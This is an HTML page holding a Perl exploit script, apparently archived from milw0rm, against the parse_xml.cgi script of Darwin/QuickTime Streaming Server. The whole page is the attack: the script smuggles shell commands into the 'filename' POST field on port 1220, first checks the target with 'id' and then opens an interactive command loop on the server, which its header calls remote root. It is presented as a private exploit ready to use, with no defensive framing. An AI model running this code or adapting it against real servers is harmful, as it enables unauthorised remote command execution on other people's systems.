<html><head><title>Darwin Streaming Server <= 4.1.2 (parse_xml.cgi) Code Execution Exploit</title></head><pre>#!/usr/bin/perl
#
# QTTS REMOTE ROOT  exploit by FOX_MULDER (fox_mulder@abv.bg)
# FOX_MULDER PRESENTS    fox_mulder_at_abv.bg
#
# Darwin(OSX)4.x(?) 5.X QTSS(Quick Time Stream Server) 3.X
#
# The bug in Darwin 5.X with unpatched QTSS in parse_xml.cgi which lead to remote root compromise:
#    $filename = $query-&gt;{'filename'};
#    $templatefile = $query-&gt;{'template'};
# Based on http://wbyte.ath.cx/~wbyte/researches/qtss-core.txt#
###########################

use IO::Socket;
use LWP::Simple; 
use LWP 5.64;

sub Usage {
print STDERR &quot;\nQTTS REMOTE ROOT EXPLOIT BY FOX_MULDER !!!\n&quot;;
print STDERR &quot;Usage:cenex.pl &lt;www.example.com&gt; \n&quot;;
exit;
}

if (@ARGV &lt; 1)
{
 Usage();
}


$host = @ARGV[0];
print &quot;\n\n !!!PRIVATE EXPLOIT!!! \n\n&quot;;
print &quot;Darwin QTTS Remote Root Exploit by FOX_MULDER\n&quot;;

print &quot;\n[+] Conecting to $host\n&quot;;
&amp;check($command=&quot;id&quot;);
&amp;hack($command=&quot;uname -a;id&quot;);
while ()
 {
    print &quot;Command# &quot;;
    while(&lt;STDIN&gt;)
     {
        $command=$_;
        chomp($command);
        exit() if ($command eq 'exit');
        last;
     }
    &amp;hack($command);
 }

&amp;hack($command);

sub hack{
my $browser = LWP::UserAgent-&gt;new;
   $browser-&gt;agent('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)');

  my $url = &quot;http://$host:1220/parse_xml.cgi&quot;;
  my $response = $browser-&gt;post( $url,
    [
        'filename' =&gt; &quot;;$command|&quot;
]
  );


  die &quot;Received invalid response type&quot;, $response-&gt;content_type
   unless $response-&gt;content_type eq 'text/html';

        print $response-&gt;content;


}



sub check{
print &quot;[+] Checking if vulnerable . . .\n&quot;;
my $browser = LWP::UserAgent-&gt;new;
   $browser-&gt;agent('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)');

  my $url = &quot;http://$host:1220/parse_xml.cgi&quot;;
  my $response = $browser-&gt;post( $url,
    [
        'filename' =&gt; &quot;;$command|&quot;
]
  );

 	my $code = $response-&gt;status_line;
	if($code != 200){
	print &quot;Not vulnerable\n&quot;;
	exit;
        }
       print &quot;[+] Status $code ...\n&quot;;
}

# milw0rm.com [2003-02-24]</pre></html>